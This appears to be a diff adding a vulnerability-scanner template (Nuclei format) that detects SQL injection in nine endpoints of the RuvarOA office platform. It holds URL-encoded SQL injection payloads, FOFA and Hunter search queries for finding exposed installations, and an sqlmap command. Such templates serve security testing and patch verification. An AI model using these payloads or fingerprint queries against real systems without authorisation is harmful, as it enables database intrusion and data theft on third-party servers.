@@ -1,0 +1,35 @@
+id: ruvaroa-mutli-sqli
+info:
+  name: RuvarOA 协同办公平台多处 - sqli
+  author: leadlife
+  severity: high
+  description: RuvarOA是由广州市璐华计算机科技有限公司开发的一款企业协同办公平台。该平台继承了传统OA产品的所有优秀特性，并在此基础上增加了更齐全的功能模块，极大地扩大了应用的覆盖面。
+  reference: 
+    - https://github.com/wy876/POC/blob/f438c90ba8c03d44841a8129daa16a8535cab132/RuvarOA%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0/RuvarOA%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0%E5%A4%9A%E5%A4%84%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: body="txt_admin_key"
+    hunter-query: web.body="txt_admin_key"
+    sqlmap: sqlmap -u "http://example.com?index=1" -p <use_discover> --batch --random-agent --dbms="Microsoft SQL Server"
+  tags: ruvaroa,sqli,oa
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/filemanage/file_memo.aspx?file_id=@@version"
+      - "{{BaseURL}}/WorkFlow/wf_work_form_save.aspx?office_missive_id=@@version"
+      - "{{BaseURL}}/WorkFlow/wf_office_file_history_show.aspx?id=1%27%20and%20%28@@version%29%3E0--"
+      - "{{BaseURL}}/WorkFlow/wf_get_fields_approve.aspx?template_id=@@version"
+      - "{{BaseURL}}/CorporateCulture/kaizen_download.aspx?file_id=1%27%29%20and%20%28select%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))%29%3E0--"
+      - "{{BaseURL}}/include/get_dict.aspx?bi_value=1&bt_id=1%29+AND+1248+IN+%28SELECT+@@version%29+AND+%282558%3D2558&bt_name=1&bi_name=1"
+      - "{{BaseURL}}/LHMail/email_attach_delete.aspx?attach_id=@@version"
+      - "{{BaseURL}}/WorkPlan/WorkPlanAttachDownLoad.aspx?sys_file_storage_id=1%27%20and%20%28@@version%29%3E0%29--"
+      - "{{BaseURL}}/WorkFlow/OfficeFileDownload.aspx?filename=1%27%20and%20%28@@version%29%3E0--"
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,'Microsoft','SQL Server')
+          - contains(body,'c4ca4238a0b923820dcc509a6f75849b')
+        condition: or
